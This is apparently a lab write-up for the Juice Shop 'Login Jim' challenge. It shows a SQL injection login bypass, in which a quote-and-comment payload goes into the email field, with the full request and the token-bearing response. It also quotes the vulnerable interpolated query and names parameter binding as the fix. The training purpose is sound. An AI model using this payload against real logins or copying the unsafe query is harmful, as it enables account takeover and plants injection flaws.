# Login Jim
**Description**
Log in with Jim's user account.

Style: Tutorial, With Coding Challenge
Topic: Injection

## Solutions
### Web Solution

I would start with finding the the username for `jim`.

We have a `jim@juice-sh.op` (found at `/#/administration`)

Now let go back to the `login-page` and try some games there...

Tried the same *trick* as always, add a `'` and comment the rest of the line (via `--`).

Request was
```python
POST /rest/user/login HTTP/1.1
...
Connection: keep-alive

{
    "email":"jim@juice-sh.op'--",
    "password":"asdf"
}
```

And response was
```python
HTTP/1.1 200 OK
...
Keep-Alive: timeout=5

{
    "authentication":{
        "token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0xMyAwODozNTo1Ni4wNDkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0xMyAwODozNTo1Ni4wNDkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgxMzQxNzYwfQ.QM4a3r_VjgXVFMW0sAt66QCvEszP-iJ-ksqttlNwVjrDVAZr711kyP6VyNE0ZV9-L4zT00a682_WuedOTv5dsW4qycXTZRaMaT53upRjc7bMXWeoF8artntRrA7UiE5AxQZJnUPPPpkiXrCBm4MD0SgBAXfPD8rNBnzsq9GQkow",
        "bid":2,
        "umail":"jim@juice-sh.op"
    }
}
```

### Coding Challenge

The problematic line is the unverified ( or clean) usage in SQL query:
```javascript
models.sequelize.query(`SELECT * FROM Users WHERE email = '${username}' AND password = '${hash}' AND deletedAt IS NULL`)
```
It's line 15, the fix is to use `bind` command so it will automatically handle problematic input